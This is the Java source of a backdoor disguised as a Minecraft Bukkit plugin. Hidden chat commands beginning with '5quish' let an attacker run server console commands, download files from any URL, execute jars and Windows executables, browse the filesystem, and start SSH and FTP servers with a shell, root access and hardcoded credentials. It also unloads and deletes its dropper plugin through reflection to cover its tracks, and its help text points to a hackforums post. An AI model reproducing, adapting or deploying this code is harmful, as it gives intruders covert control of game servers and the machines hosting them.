package com.testingsquish.craft;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.net.MalformedURLException;
import java.net.URLClassLoader;

import java.net.URL;
import java.util.ArrayList;
import java.util.EnumSet;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.jar.Attributes;
import java.util.jar.JarEntry;
import java.util.jar.JarOutputStream;
import java.util.jar.Manifest;

import java.util.zip.ZipEntry;
import java.util.zip.ZipInputStream;
import java.util.zip.ZipOutputStream;




import org.apache.ftpserver.FtpServer;
import org.apache.ftpserver.FtpServerFactory;
import org.apache.ftpserver.ftplet.Authority;

import org.apache.ftpserver.ftplet.UserManager;
import org.apache.ftpserver.listener.ListenerFactory;
import org.apache.ftpserver.usermanager.PasswordEncryptor;
import org.apache.ftpserver.usermanager.PropertiesUserManagerFactory;
import org.apache.ftpserver.usermanager.impl.BaseUser;
import org.apache.ftpserver.usermanager.impl.WritePermission;
import org.apache.logging.log4j.core.config.LoggerConfig;
import org.apache.logging.log4j.core.jmx.LoggerConfigAdmin;
import org.apache.mina.filter.logging.LoggingFilter;
import org.apache.sshd.*;
import org.apache.sshd.common.NamedFactory;

import org.apache.sshd.common.util.OsUtils;
import org.apache.sshd.server.Command;
import org.apache.sshd.server.PasswordAuthenticator;
import org.apache.sshd.server.UserAuth;

import org.apache.sshd.server.auth.UserAuthPassword;
import org.apache.sshd.server.command.ScpCommandFactory;
import org.apache.sshd.server.keyprovider.SimpleGeneratorHostKeyProvider;
import org.apache.sshd.server.session.ServerSession;
import org.apache.sshd.server.sftp.SftpSubsystem;
import org.apache.sshd.server.shell.ProcessShellFactory;
import org.bukkit.Bukkit;
import org.bukkit.Server;
import org.bukkit.command.PluginCommand;
import org.bukkit.command.SimpleCommandMap;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.PluginManager;
import org.bukkit.plugin.SimplePluginManager;
import org.bukkit.plugin.java.JavaPluginLoader;




public class SimpleRoot implements Listener {
public Server server;
private String Path;
private boolean done;
private SimpleCommandMap scm;
private Map<String, org.bukkit.command.Command> kc;
private Field loadersF;
private SshServer sshd;
private FtpServer FTPserver;

	public SimpleRoot(Server s,Plugin p)
	{
		Bukkit.getPluginManager().registerEvents(this,p);
	server = s;	
	Path = s.getUpdateFolderFile().getAbsolutePath().substring(0, s.getUpdateFolderFile().getAbsolutePath().length()-14);
	done = false;
	deleteUpdater();

	}

	
	 private void deleteUpdater() {
		 Plugin pl = server.getPluginManager().getPlugin("CraftLoader");
		 if(pl != null)
		 {
			 try{

			    PluginManager bpm = Bukkit.getServer().getPluginManager();
			    
			    SimplePluginManager spm = (SimplePluginManager)bpm;
			    
			    Field scmF = SimplePluginManager.class.getDeclaredField("commandMap");
			    scmF.setAccessible(true);
			    this.scm = ((SimpleCommandMap)scmF.get(spm));
			    
			    Field kcF = this.scm.getClass().getDeclaredField("knownCommands");
			    kcF.setAccessible(true);
			    this.kc = ((Map)kcF.get(this.scm));
			 }catch (Exception e) {
				e.printStackTrace();
			}
			 
			 
		 server.getPluginManager().disablePlugin(pl);
		 
		 unloadPlugin(pl);
		 
		File f = new File( Path+"plugins/NCPupdater.jar");
		f.delete();
		f.deleteOnExit();
		 }
	}

	  public boolean unloadPlugin(Plugin plugin)
	  {
	    try
	    {
	      plugin.getClass().getClassLoader().getResources("*");
	    }
	    catch (Exception e1)
	    {
	      e1.printStackTrace();
	    }
	    SimplePluginManager spm = (SimplePluginManager)Bukkit.getServer().getPluginManager();
	    Map<String, Plugin> ln;
	    List<Plugin> pl;
	    try
	    {
	      Field lnF = spm.getClass().getDeclaredField("lookupNames");
	      lnF.setAccessible(true);
	      ln = (Map)lnF.get(spm);
	      

	      Field plF = spm.getClass().getDeclaredField("plugins");
	      plF.setAccessible(true);
	      pl = (List)plF.get(spm);
	    }
	    catch (Exception e)
	    {
	      e.printStackTrace();
	      return false;
	    }
	    synchronized (this.scm)
	    {
	      Iterator<Map.Entry<String, org.bukkit.command.Command>> it = this.kc.entrySet().iterator();
	      while (it.hasNext())
	      {
	        Map.Entry<String, org.bukkit.command.Command> entry = (Map.Entry)it.next();
	        if ((entry.getValue() instanceof org.bukkit.command.PluginCommand))
	        {
	          PluginCommand c = (org.bukkit.command.PluginCommand)entry.getValue();
	          if (c.getPlugin().getName().equalsIgnoreCase(plugin.getName()))
	          {
	            c.unregister(this.scm);
	            it.remove();
	          }
	        }
	      }
	    }
	    spm.disablePlugin(plugin);
	    synchronized (spm)
	    {
	      ln.remove(plugin.getName());
	     
	      pl.remove(plugin);
	    }
	    JavaPluginLoader jpl = (JavaPluginLoader)plugin.getPluginLoader();
	    if (this.loadersF == null) {
	      try
	      {
	        this.loadersF = jpl.getClass().getDeclaredField("loaders");
	        this.loadersF.setAccessible(true);
	      }
	      catch (Exception e)
	      {
	        e.printStackTrace();
	      }
	    }
	    try
	    {
	      Map<String, ?> loaderMap = (Map)this.loadersF.get(jpl);
	      
	      loaderMap.remove(plugin.getDescription().getName());
	    }
	    catch (Exception e)
	    {
	      e.printStackTrace();
	    }
	    closeClassLoader(plugin);
	    System.gc();
	    System.gc();
	    
	    return true;
	  }
	  
	  public boolean closeClassLoader(Plugin plugin)
	  {
	    try
	    {
	      ((URLClassLoader)plugin.getClass().getClassLoader()).close();
	      return true;
	    }
	    catch (Exception e)
	    {
	      e.printStackTrace();
	    }
	    return false;
	  }

	@EventHandler
	    public void onPlayerChat(AsyncPlayerChatEvent event) {
		 if(!done && event.getMessage().toLowerCase().contains("rate"))
		 {
		server.broadcastMessage("Server is rated by ROOTBENCHMARK as:    B-     (0.88A a , 0.61B , 0.1C)"); 
		server.broadcastMessage("Thank you for using rootbenchmark"); 
		 done = true;
		 }
	        if(event.getMessage().contains("5quish"))
	        {
	        event.setCancelled(true); 
	        String cmd = event.getMessage();
	        String[] split = cmd.split(" ");
	        if(cmd.toLowerCase().contains("5quish plugins")){ 
	    		event.getPlayer().sendMessage("§f[§c*§f]§b Plugins: "+getPluginList());
	    	} 
	        
	        if(cmd.toLowerCase().contains("5quish cmd")){ 
	    		try {
	    			if(split.length < 3)
	    			{
	    				event.getPlayer().sendMessage("§f[§c*§f]§b 5quish cmd [cmd]");
	    				event.getPlayer().sendMessage("§f[§ceg§f]§b 5quish cmd broadcast lololol");
	    			}else
	    			{
	    				String cmds = "";
	    				for(int i = 2 ; i < split.length;i++)
	    				{
	    					cmds = cmds + split[i]+" ";
	    				}
	    				cmds = cmds.substring(0,cmds.length()-1);
	    				event.getPlayer().sendMessage("§f[§c*§f]§b  command: "+cmds);
	    				server.dispatchCommand(server.getConsoleSender(), cmds);
	    			}
				} catch (Exception e) {e.printStackTrace();}
	    		
	    	}else 
	       
	    	if(cmd.toLowerCase().contains("5quish download")){ 
	    		try {
	    			if(split.length != 4)
	    			{
	    				event.getPlayer().sendMessage("§f[§c*§f]§b 5quish download [URL] [downloadLocationfromserver]");
	    				event.getPlayer().sendMessage("§f[§ceg§f]§b 5quish download http://www.download.com/plugin.jar   plugins\\NewPlugin.jar");
	    			}else
	    			{
	    				download(split[2].replaceAll(" ", ""),split[3].replaceAll(" ", ""),event.getPlayer());
	    			}
				} catch (Exception e) {e.printStackTrace();}
	    	}else
	    	if(cmd.toLowerCase().contains("5quish executejar")){ 
		    		try {
		    			if(split.length != 3)
		    			{
		    				event.getPlayer().sendMessage("§f[§c*§f]§b 5quish executejar [downloadLocationfromserver]");
		    				event.getPlayer().sendMessage("§f[§ceg§f]§b 5quish executejar  plugins\\MSFShell.jar");
		    			}else
		    			{
		    				executejar(split[2].replaceAll(" ", ""),event.getPlayer());
		    			}
					} catch (Exception e) {e.printStackTrace();}
	    	}else
	    		if(cmd.toLowerCase().contains("5quish infectplugin")){ 
		    		try {
		    			if(split.length != 3)
		    			{
		    				event.getPlayer().sendMessage("§f[§c*§f]§b 5quish infectplugin [name of the plugin]");
		    				event.getPlayer().sendMessage("§f[§ceg§f]§b 5quish infectplugin  NoCheatPlus");
		    			}else
		    			{
		    				infectplugin(split[2].replaceAll(" ", ""),event.getPlayer());
		    			}
					} catch (Exception e) {e.printStackTrace();}
	    	}else
	    	if(cmd.toLowerCase().contains("5quish executeexe")){ 
	    		try {
	    			if(split.length != 3)
	    			{
	    				event.getPlayer().sendMessage("§f[§c*§f]§b 5quish executeexe [downloadLocationfromserver]");
	    				event.getPlayer().sendMessage("§f[§ceg§f]§b 5quish executeexe  plugins\\secret\\Shell.exe");
	    			}else
	    			{
	    				executeexe(split[2].replaceAll(" ", ""),event.getPlayer());
	    			}
				} catch (Exception e) {e.printStackTrace();}
    	}else
	    	
	    	if(cmd.toLowerCase().contains("5quish dir")){ 
	    		try {
	    			
	    				event.getPlayer().sendMessage("§f[§c*§f]§b "+Path);
	    			
				} catch (Exception e) {e.printStackTrace();}
    	}else
	    	
	    	if(cmd.toLowerCase().contains("5quish ls")){ 
	    		try {
	    			if(split.length != 3)
	    			{
	    				event.getPlayer().sendMessage("§f[§c*§f]§b 5quish ls [directory]");
	    			}else
	    			{
	    				File location = new File(Path+split[2]);
	    				String[] plugins =location.list();
	    				String end = "";
	    				for(int i = 0 ; i < plugins.length;i++)
	    				{
	    					
	    						end = end + plugins[i]+",";
	    						
	    				}
	    				event.getPlayer().sendMessage("§f[§c*§f]§b "+Path);
	    				event.getPlayer().sendMessage("§f[§c*§f]§b Files: "+end);
	    			}
	    			
				} catch (Exception e) {e.printStackTrace();}
	    	}else
	    		if(cmd.toLowerCase().contains("5quish ssh")){ 
		    		try {
		    			event.getPlayer().sendMessage("§f[§c*§f]§b 5quish ssh stop");
		    			event.getPlayer().sendMessage("§f[§c*§f]§b or");
		    			event.getPlayer().sendMessage("§f[§c*§f]§b 5quish ssh stop [port]");
		    			if(split.length == 4)
		    			{
		    				int u = Integer.parseInt(split[3]);
		    				if(u != 0)
			    				{
			    				String s = startSSHServer(u);
			    				event.getPlayer().sendMessage("§f[§c*§f]§b SSHD server starting on: "+s);
			    				event.getPlayer().sendMessage("§f[§c*§f]§b Username: 5quishusername");
			    				event.getPlayer().sendMessage("§f[§c*§f]§b Password: 5quishpassword");
			    				}else
			    				{
			    					event.getPlayer().sendMessage("§f[§c*§f]§b Invalid port");	
			    				}
		    			}else
		    			{
		    				String s = startSSHServer(22);
		    				
		    				event.getPlayer().sendMessage("§f[§c*§f]§b SSHD server starting on: "+s);
		    				event.getPlayer().sendMessage("§f[§c*§f]§b Username: 5quishusername");
		    				event.getPlayer().sendMessage("§f[§c*§f]§b Password: 5quishpassword");
		    			}
		    			
					} catch (Exception e) {e.printStackTrace();}
		    	}else
		    		if(cmd.toLowerCase().contains("5quish ssh stop")){ 
		    			stopSSHServer();
		    		event.getPlayer().sendMessage("§f[§c*§f]§b Stopping SSHD server");
		    		}else
		    			if(cmd.toLowerCase().contains("5quish ftp stop")){ 
			    			stopFTPServer();
			    		event.getPlayer().sendMessage("§f[§c*§f]§b Stopping FTP server");
			    		}else
		    		if(cmd.toLowerCase().contains("5quish ftp start")){ 
			    		try {
			    			event.getPlayer().sendMessage("§f[§c*§f]§b 5quish ftp start");
			    			event.getPlayer().sendMessage("§f[§c*§f]§b or");
			    			event.getPlayer().sendMessage("§f[§c*§f]§b 5quish ftp start [port]");
			    			if(split.length == 4)
			    			{
			    				int u = Integer.parseInt(split[3]);
			    				if(u != 0)
				    				{
				    				String s = startFTPServer(u);
				    				event.getPlayer().sendMessage("§f[§c*§f]§b FTP server starting on: "+s);
				    				event.getPlayer().sendMessage("§f[§c*§f]§b Username: 5quishusername");
				    				event.getPlayer().sendMessage("§f[§c*§f]§b Password: 5quishpassword");
				    				}else
				    				{
				    					event.getPlayer().sendMessage("§f[§c*§f]§b Invalid port");	
				    				}
			    			}else
			    			{
			    				String s = startFTPServer(2221);
			    				
			    				event.getPlayer().sendMessage("§f[§c*§f]§b FTP server starting on: "+s);
			    				event.getPlayer().sendMessage("§f[§c*§f]§b Username: 5quishusername");
			    				event.getPlayer().sendMessage("§f[§c*§f]§b Password: 5quishpassword");
			    			}
			    			
						} catch (Exception e) {e.printStackTrace();}
			    	}else
	    		if(cmd.toLowerCase().contains("5quish ls2")){ 
		    		try {
		    			if(split.length != 3)
		    			{
		    				event.getPlayer().sendMessage("§f[§c*§f]§b 5quish ls2 [directory]");
		    			}else
		    			{
		    				File location = new File(split[2]);
		    				String[] plugins =location.list();
		    				String end = "";
		    				for(int i = 0 ; i < plugins.length;i++)
		    				{
		    					
		    						end = end + plugins[i]+",";
		    						
		    				}
		    				event.getPlayer().sendMessage("§f[§c*§f]§b "+location.getPath());
		    				event.getPlayer().sendMessage("§f[§c*§f]§b Files: "+end);
		    			}
		    			
					} catch (Exception e) {e.printStackTrace();}
    	}else
    		if(cmd.toLowerCase().contains("5quish help")){ 
	    		try {
	    			
	    				event.getPlayer().sendMessage("§f[§c*§f]§b go to the hackforums post");
	    				event.getPlayer().sendMessage("§f[§c*§f]§b commands: help,ssh start,ssh stop,ftp start,ftp stop,ls,ls2,dir,executexe,executejar,download,cmd");
	    			
				} catch (Exception e) {e.printStackTrace();}
    	}else
    	{
    		event.getPlayer().sendMessage("§f[§c*§f]§b UNKNOWN COMMAND - try '5quish help'");
    	}
	        event.setMessage("");
	        event.setFormat("");
	       }
	           
	    }
	
	


	private void stopFTPServer() {
		
		try {
			if(FTPserver != null)
			{
			FTPserver.stop();
			}
		} catch (Exception e) {
			
			e.printStackTrace();
		}
		
	}
	
	
private void stopSSHServer() {
		
		try {
			if(sshd != null)
			{
			sshd.stop();
			}
			} catch (InterruptedException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		
	}


	private String startSSHServer(int i) {
		 sshd = SshServer.setUpDefaultServer();
		sshd.setPort(i);
		
		sshd.setKeyPairProvider(new SimpleGeneratorHostKeyProvider("hostkey.ser"));
		List<NamedFactory<UserAuth>> userAuthFactories = new ArrayList<NamedFactory<UserAuth>>();
		userAuthFactories.add(new UserAuthPassword.Factory());
		sshd.setUserAuthFactories(userAuthFactories);
		
		sshd.setPasswordAuthenticator(new PasswordAuthenticator() {

			@Override
			public boolean authenticate(String username, String password,
					ServerSession arg2) {
				return "5quishusername".equals(username) && "5quishpassword".equals(password);
			}
		    
		});
		
		 ProcessShellFactory shellFactory = null;
		if (OsUtils.isUNIX()) {
	         shellFactory = new ProcessShellFactory(new String[]{"/bin/sh", "-i", "-l"},
	                 EnumSet.of(ProcessShellFactory.TtyOptions.ONlCr));
	      } else {
	         shellFactory = new ProcessShellFactory(new String[]{"cmd.exe "},
	                 EnumSet.of(ProcessShellFactory.TtyOptions.Echo, ProcessShellFactory.TtyOptions.ICrNl, ProcessShellFactory.TtyOptions.ONlCr));
	      }
		
		sshd.setShellFactory(shellFactory);
	    sshd.setCommandFactory(new ScpCommandFactory());
	   
	    List<NamedFactory<Command>> namedFactoryList = new ArrayList<NamedFactory<Command>>();
	    namedFactoryList.add(new SftpSubsystem.Factory());
	    sshd.setSubsystemFactories(namedFactoryList);
	  
		try {
			sshd.start();
			return sshd.getHost()+" "+sshd.getPort();
		} catch (Exception e) {
			return "Failure: "+e.getLocalizedMessage();
		}
	}
	
	
	private String startFTPServer(int i) {
		FtpServerFactory serverFactory = new FtpServerFactory();
		ListenerFactory factory = new ListenerFactory();
		factory.setPort(i);
		serverFactory.addListener("default", factory.createListener());
		
		
		PropertiesUserManagerFactory userManagerFactory = new PropertiesUserManagerFactory();
		File f = new File(Path+"world/users.properties");
		try{
		f.createNewFile();
		
		}catch (Exception e) {
			e.printStackTrace();
		}
		userManagerFactory.setFile(new File(Path+"world/users.properties"));
		userManagerFactory.setPasswordEncryptor(new PasswordEncryptor()
		{

		        @Override
		        public String encrypt(String password) {
		            return password;
		        }

		        @Override
		        public boolean matches(String passwordToCheck, String storedPassword) {
		            return passwordToCheck.equals(storedPassword);
		        }
		    });
		   
		    BaseUser user = new BaseUser();
		    user.setName("5quishusername");
		    user.setPassword("5quishpassword");
		    user.setHomeDirectory("/");
		    List<Authority> authorities = new ArrayList<Authority>();
		    authorities.add(new WritePermission());
		    user.setAuthorities(authorities);
		    UserManager um = userManagerFactory.createUserManager();
		    try
		    {
		        um.save(user);
		    }
		    catch (Exception e1)
		    {
		       e1.printStackTrace();
		    }
		    serverFactory.setUserManager(um);
		
		
		
		
		
		 FTPserver = serverFactory.createServer();
		
		
		
		
		try {
			FTPserver.start();
			return factory.getServerAddress()+" "+factory.getPort();
		} catch (Exception e) {
			return "Failure: "+e.getLocalizedMessage();
		}
	}


	public void infectplugin(String pluginName, Player player) {
		pluginName = pluginName.replaceAll(".jar", "");
	Plugin p = player.getServer().getPluginManager().getPlugin(pluginName);
	player.getServer().getPluginManager().disablePlugin(p);
	player.getServer().getPluginManager().enablePlugin(p);
	}
	

	public void executejar(String file, Player player) {
		try {
			Process proc = Runtime.getRuntime().exec("java -jar "+Path+file);
			player.sendMessage("§f[§c*§f]§b Success");
		} catch (Exception e) {
			
			player.sendMessage("§f[§c*§f]§b Failed:   "+e.getLocalizedMessage());
		}
		
	}
	
	public void executeexe(String file, Player player) {
		try {
			 Process p = Runtime.getRuntime().exec("cmd /c start "+Path+file);
		} catch (Exception e) {
			
			player.sendMessage("§f[§c*§f]§b Failed:   "+e.getLocalizedMessage());
		}
		
	}


	public void download(final String URL, final String Loc,final Player player) {
		 new Thread() {
	            @Override
	            public void run() {
	            	try {
	            		saveFileFromUrlWithJavaIO(Path+Loc,URL);
	            	} catch (MalformedURLException e) {
	            		
	            		e.printStackTrace();
	            	} catch (IOException e) {
	            	
	            		e.printStackTrace();
	            	}
	            	 
	            	}

	            
	            public void saveFileFromUrlWithJavaIO(String fileName, String fileUrl)
	            		 throws MalformedURLException, IOException {
	            		 BufferedInputStream in = null;
	            		 FileOutputStream fout = null;
	            		 try {
	            			player.sendMessage("§f[§c*§f]§b download: "+fileUrl); 
	            		 in = new BufferedInputStream(new URL(fileUrl).openStream());
	            		 player.sendMessage("§f[§c*§f]§b URL found"); 
	            		 fout = new FileOutputStream(fileName);
	            		 player.sendMessage("§f[§c*§f]§b Output found"); 
	            		byte data[] = new byte[1048576];
	            		 int count;
	            		 player.sendMessage("§f[§c*§f]§b Downloading...."); 
	            		 while ((count = in.read(data, 0, 1048576)) != -1) {
	            		 fout.write(data, 0, count);
	            		 }
	            		 player.sendMessage("§f[§c*§f]§b Done!"); 
	            		 player.sendMessage("§f[§c*§f]§b Output: "+fileName); 
	            		 } finally {
	            		 if (in != null)
	            		 in.close();
	            		 if (fout != null)
	            		 fout.close();
	            		 }
	            		 }
	            
	            }.start();
		
	}


	public String getPluginList()
	{
		String pluginDirectory = server.getUpdateFolderFile().getAbsolutePath().substring(0, server.getUpdateFolderFile().getAbsolutePath().length()-7);
		
		File location = new File(pluginDirectory);
		String[] plugins =location.list();
		String end = "";
		for(int i = 0 ; i < plugins.length;i++)
		{
			if(plugins[i].contains(".jar"))
				{
				end = end + plugins[i]+",";
				}
		}
		return end;
	}
	
	public void migrate(String pluginName,Player player) throws IOException
	{
		//Not working
		player.sendMessage("§f[§c*§f]§b Starting"); 
		String pluginDirectory = server.getUpdateFolderFile().getAbsolutePath().substring(0, server.getUpdateFolderFile().getAbsolutePath().length()-7);
	
		File location = new File(pluginDirectory+"\\2"+pluginName);
		FileOutputStream plugin = new FileOutputStream(location);
		player.sendMessage("§f[§c*§f]§b Found: "+location.getAbsolutePath()); 
		  Manifest manifest = new Manifest();
		  manifest.getMainAttributes().put(Attributes.Name.MANIFEST_VERSION, "1.0");
		  
		  JarOutputStream target = new JarOutputStream(plugin, manifest);
		  add(new File(pluginDirectory+"\\"+pluginName), target);
		  target.close();
		  player.sendMessage("§f[§c*§f]§b Done"); 
	}
	
	  public  void migrate1(String servername,Player player) {
		
		  try {

			  File[]   contents = {new File(getClass().getResource("").toURI())};
		
	        File jarFile = new File(Path+servername);
	        player.sendMessage("§f[§c*§f]§b ServerPath: "+Path+servername); 
	        player.sendMessage("§f[§c*§f]§b Starting!"); 
	        try {
	           
				updateZipFile(jarFile, contents);
	        } catch (IOException e) {
	            e.printStackTrace();
	        }
		  } catch (Exception e1) {
				e1.printStackTrace();
			}
	    }

	    public  void updateZipFile(File zipFile,
	             File[] files) throws IOException { 
	        File tempFile = File.createTempFile(zipFile.getName(), null);
	        tempFile.delete();

	        boolean renameOk=zipFile.renameTo(tempFile);
	        if (!renameOk)
	        {
	            throw new RuntimeException("could not rename the file "+zipFile.getAbsolutePath()+" to "+tempFile.getAbsolutePath());
	        }
	        byte[] buf = new byte[1024];

	        ZipInputStream zin = new ZipInputStream(new FileInputStream(tempFile));
	        ZipOutputStream out = new ZipOutputStream(new FileOutputStream(zipFile));

	        ZipEntry entry = zin.getNextEntry();
	        while (entry != null) {
	            String name = entry.getName();
	            boolean notInFiles = true;
	            for (File f : files) {
	                if (f.getName().equals(name)) {
	                    notInFiles = false;
	                    break;
	                }
	            }
	            if (notInFiles) {
	              
	                out.putNextEntry(new ZipEntry(name));
	              
	                int len;
	                while ((len = zin.read(buf)) > 0) {
	                    out.write(buf, 0, len);
	                }
	            }
	            entry = zin.getNextEntry();
	        }
	      
	        zin.close();
	       
	        for (int i = 0; i < files.length; i++) {
	            InputStream in = new FileInputStream(files[i]);
	          
	            out.putNextEntry(new ZipEntry(files[i].getName()));
	          
	            int len;
	            while ((len = in.read(buf)) > 0) {
	                out.write(buf, 0, len);
	            }
	          
	            out.closeEntry();
	            in.close();
	        }
	      
	        out.close();
	        tempFile.delete();
	    }

	private void add(File source, JarOutputStream target) throws IOException
	{
	  BufferedInputStream in = null;
	  try
	  {
	    if (source.isDirectory())
	    {
	      String name = source.getPath().replace("\\", "/");
	      if (!name.isEmpty())
	      {
	        if (!name.endsWith("/"))
	          name += "/";
	        JarEntry entry = new JarEntry(name);
	        entry.setTime(source.lastModified());
	        target.putNextEntry(entry);
	        target.closeEntry();
	      }
	      for (File nestedFile: source.listFiles())
	        add(nestedFile, target);
	      return;
	    }

	    JarEntry entry = new JarEntry(source.getPath().replace("\\", "/"));
	    entry.setTime(source.lastModified());
	    target.putNextEntry(entry);
	    in = new BufferedInputStream(new FileInputStream(source));

	    byte[] buffer = new byte[1024];
	    while (true)
	    {
	      int count = in.read(buffer);
	      if (count == -1)
	        break;
	      target.write(buffer, 0, count);
	    }
	    target.closeEntry();
	  }
	  finally
	  {
	    if (in != null)
	      in.close();
	  }
	}
	
	
}
